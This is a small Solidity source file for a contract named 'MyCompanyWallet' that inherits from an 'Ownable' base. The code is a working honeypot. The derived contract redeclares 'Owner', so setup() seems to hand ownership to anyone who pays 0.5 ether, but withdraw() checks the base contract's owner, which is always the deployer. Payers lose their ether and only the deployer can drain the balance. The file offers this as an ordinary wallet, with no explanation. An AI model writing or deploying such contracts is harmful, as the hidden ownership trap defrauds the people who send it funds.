1 pragma solidity ^0.4.24;
2 
3 contract Ownable {
4     address public Owner = msg.sender;
5     function isOwner() public returns (bool) {
6         if (Owner == msg.sender) {
7             return true; 
8         }
9         return false;
10     }
11 }
12 
13 contract MyCompanyWallet is Ownable {
14     address public Owner;
15     
16     function setup() public payable {
17         if (msg.value >= 0.5 ether) {
18             Owner = msg.sender;
19         }
20     }
21     
22     function withdraw() public {
23         if (isOwner()) {
24             msg.sender.transfer(address(this).balance);
25         }
26     }
27     
28     function() public payable { }
29 }